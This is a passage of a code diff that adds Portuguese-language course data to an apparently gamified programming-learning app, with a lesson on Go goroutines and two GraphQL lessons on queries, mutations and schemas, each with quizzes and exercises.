+            question: 'O que a palavra-chave "go" faz quando colocada antes da chamada de uma função (ex: go coletarDados())?',
+            options: [
+              'Converte a função em um arquivo PDF para download.',
+              'Inicia a execução da função em segundo plano de forma concorrente em uma nova Goroutine.',
+              'Compila a função para a linguagem C.',
+              'Cancela a execução de todas as outras funções do programa.'
+            ],
+            correctIndex: 1,
+            explanation: 'A palavra go inicia uma Goroutine imediatamente, permitindo que a função execute em paralelo de maneira ultraleve sem bloquear a thread principal.'
+          },
+          {
+            type: 'code',
+            instruction: 'Escreva a linha de código em Go para criar um canal síncrono de inteiros chamado canalNumeros usando a função make.',
+            initialCode: `// Crie o canal abaixo\n`,
+            expectedKeywords: ['canalNumeros := make(chan int)'],
+            hint: 'Use a sintaxe: canalNumeros := make(chan int).',
+            solution: `canalNumeros := make(chan int)`
+          }
+        ]
+      }
+    ]
+  },
+  {
+    id: 'graphql',
+    slug: 'graphql',
+    name: 'GraphQL',
+    planetName: 'Matriz Conectiva',
+    description: 'A linguagem de consulta para APIs criada pelo Meta. Peça exatamente os dados que precisa, nada mais, nada menos.',
+    icon: '🔮',
+    color: '#E10098',
+    language: 'graphql',
+    level: 'Intermediário',
+    totalXp: 130,
+    lessons: [
+      {
+        id: 'graphql-1',
+        title: '1. O Fim do Over-fetching: Consultas Declarativas',
+        description: 'Diga adeus a múltiplos endpoints e payloads gigantes. Peça apenas os campos necessários na tela.',
+        duration: 15,
+        xpReward: 65,
+        language: 'graphql',
+        content: `# 🔮 O Fim do Over-fetching na Matriz Conectiva
+
+Bem-vindo à **Matriz Conectiva**, a central de transmissão de dados do Nexus!
+
+Em 2012, quando os engenheiros do Facebook estavam migrando seus aplicativos móveis para redes celulares lentas, eles enfrentaram dois problemas graves com a arquitetura REST tradicional:
+
+1. **Over-fetching:** O endpoint \`/api/usuarios/1\` devolvia 40 campos com dados pesados quando o aplicativo móvel precisava apenas do \`nome\` e da foto de \`avatar\`.
+2. **Under-fetching:** Para montar uma tela de perfil com as missões e medalhas, o frontend precisava disparar 3 ou 4 requisições HTTP em cascata (\`/usuarios/1\`, depois \`/missoes\`, depois \`/medalhas\`).
+
+Para resolver isso de forma definitiva, eles criaram o **GraphQL**!
+
+---
+
+### 🎯 A Filosofia do GraphQL: O Cliente no Controle
+
+Com GraphQL, a API possui um **único endpoint** (geralmente \`/graphql\`). O cliente envia uma consulta no formato de documento e recebe exatamente o formato JSON correspondente:
+
+\`\`\`graphql
+# Consulta enviada pelo frontend:
+query ObterCadete {
+  cadete(id: "101") {
+    nome
+    nivel
+    xp
+  }
+}
+\`\`\`
+
+O servidor responde com precisão milimétrica:
+\`\`\`json
+{
+  "data": {
+    "cadete": {
+      "nome": "Neo",
+      "nivel": 15,
+      "xp": 8500
+    }
+  }
+}
+\`\`\`
+
+---
+
+### 🕸️ Conectando Relacionamentos em Uma Única Viagem
+
+Se você precisar dos dados do cadete e de todas as missões ativas dele:
+
+\`\`\`graphql
+query PerfilCompleto {
+  cadete(id: "101") {
+    nome
+    missoes {
+      titulo
+      recompensaXp
+    }
+  }
+}
+\`\`\`
+Tudo é resolvido e entregue em **uma única requisição HTTP**!
+
+> **💡 Dica Pro:**
+> Como o cliente sempre define o que quer receber, o backend pode adicionar novos campos no schema ao longo dos anos sem quebrar versões antigas de aplicativos móveis em circulação!
+
+> **⚠️ Armadilha Comum:**
+> Em GraphQL, as respostas de sucesso ou erro sempre retornam o código HTTP \`200 OK\`. Para verificar se houve falhas, o cliente inspeciona se o JSON contém a chave \`errors\`.`,
+        codeExample: `# Exemplo de Query GraphQL com Variáveis
+query BuscarNavePorCodigo($codigo: ID!) {
+  nave(codigo: $codigo) {
+    id
+    modelo
+    capacidade
+    status
+  }
+}`,
+        exercises: [
+          {
+            type: 'quiz',
+            question: 'O que é "Over-fetching" nas APIs REST tradicionais e como o GraphQL soluciona esse problema?',
+            options: [
+              'É quando o servidor cai por excesso de tráfego; o GraphQL adiciona mais memória RAM ao servidor.',
+              'É quando a API devolve muito mais campos e dados do que a interface realmente precisa; o GraphQL resolve permitindo que o cliente especifique os campos exatos.',
+              'É quando o cliente faz uma requisição para a porta errada do roteador.',
+              'É uma técnica avançada de compressão de imagens PNG.'
+            ],
+            correctIndex: 1,
+            explanation: 'O GraphQL elimina o over-fetching porque o cliente descreve na query a forma exata dos dados que necessita, economizando banda de rede e processamento móvel.'
+          },
+          {
+            type: 'fillblank',
+            title: 'Estruturando a Query de Tripulantes',
+            instruction: 'Complete a palavra-chave padrão de leitura do GraphQL.',
+            codeSnippet: `{{tipo_operacao}} ListarOficiais {
+  oficiais {
+    id
+    nome
+  }
+}`,
+            blanks: [
+              {
+                id: 'tipo_operacao',
+                placeholder: 'tipo de operação',
+                expectedValues: ['query'],
+                hint: 'Palavra em inglês usada para operações de busca e leitura no GraphQL.'
+              }
+            ],
+            explanation: 'Perfeito! query é o tipo raiz do GraphQL para operações de consulta seguras e sem efeito colateral.'
+          }
+        ]
+      },
+      {
+        id: 'graphql-2',
+        title: '2. Modificando o Cosmos: Mutations & Schemas Tipados',
+        description: 'Crie e altere dados com Mutations atômicas e aprenda o Schema Definition Language (SDL).',
+        duration: 16,
+        xpReward: 65,
+        language: 'graphql',
+        content: `# ⚡ Mutations & Schemas Tipados no GraphQL
+
+Se as **Queries** são usadas para buscar dados (equivalente ao \`GET\` do REST), como fazemos para criar, alterar ou deletar registros?
+
+No GraphQL, todas as operações que causam alterações ou efeitos colaterais no servidor são chamadas de **Mutations**!
+
+---
+
+### ✍️ A Anatomia de uma Mutation
+
+Uma \`mutation\` recebe parâmetros e já permite solicitar os dados resultantes na mesma requisição:
+
+\`\`\`graphql
+mutation CriarNovoCadete($nome: String!, $nivelInicial: Int!) {
+  cadastrarCadete(nome: $nome, nivel: $nivelInicial) {
+    id
+    nome
+    criadoEm
+  }
+}
+\`\`\`
+
+---
+
+### 📜 Schema Definition Language (SDL)
+
+Toda API GraphQL possui um contrato rígido chamado **Schema**. Nele definimos os tipos:
+
+\`\`\`graphql
+type Cadete {
+  id: ID!
+  nome: String!
+  nivel: Int!
+  ativo: Boolean
+}
+
+type Query {
+  obterCadete(id: ID!): Cadete
+}
+
+type Mutation {
+  cadastrarCadete(nome: String!, nivel: Int!): Cadete
+}
+\`\`\`
+
+### ❗ O Modificador \`!\` (Non-Null / Obrigatório)
+
+- \`String\`: Pode retornar um texto OU o valor \`null\`.
+- \`String!\`: É **estritamente obrigatório**. O servidor garante que nunca será retornado \`null\`.
+
+> **💡 Dica Pro:**
+> O tipo escalar nativo \`ID\` sinaliza para ferramentas e clientes como Apollo Client ou Relay que aquele campo é uma chave única ideal para normalização e atualização automática de cache na tela!
+
+> **⚠️ Armadilha Comum:**
+> Esquecer de declarar as variáveis na assinatura da mutation (ex: esquecer \`$nome: String!\`) gera erro de validação de sintaxe antes da execução.`,
+        codeExample: `# Schema Completo de Missões da Frota
+type Missao {
+  id: ID!
+  titulo: String!
+  recompensaXp: Int!
+  concluida: Boolean!
+}
+
+type Mutation {
+  concluirMissao(missaoId: ID!): Missao!
+}`,
+        exercises: [
+          {
+            type: 'quiz',
+            question: 'No Schema Definition Language (SDL) do GraphQL, o que significa o ponto de exclamação (!) após o nome de um tipo (ex: String! ou ID!)?',
+            options: [
+              'Indica que o campo contém dados altamente confidenciais.',
+              'Indica que o campo é obrigatório (Non-Null) e nunca poderá ter valor nulo.',
+              'Indica que o campo só aceita letras maiúsculas.',
+              'Indica que o campo será excluído na próxima versão da API.'
+            ],
+            correctIndex: 1,
+            explanation: 'O ponto de exclamação marca o tipo como Non-Null (não-nulo), exigindo que os clientes forneçam o dado ou garantindo que o servidor sempre o devolverá preenchido.'
+          },
+          {
+            type: 'code',
+            instruction: 'Escreva uma mutation GraphQL chamada ConcluirTreinamento que recebe a variável $id: ID! e invoca concluir(id: $id) solicitando de volta os campos id e status.',
+            initialCode: `# Escreva a mutation abaixo\n`,
+            expectedKeywords: ['mutation ConcluirTreinamento($id: ID!)', 'concluir(id: $id)', 'id', 'status'],
+            hint: 'Escreva: mutation ConcluirTreinamento($id: ID!) { concluir(id: $id) { id status } }.',
+            solution: `mutation ConcluirTreinamento($id: ID!) {
+  concluir(id: $id) {
+    id
+    status
+  }
+}`
+          }
+        ]
+      }
+    ]
+  },
 ];
 
 export function getCourseBySlug(slug: string): Course | undefined {
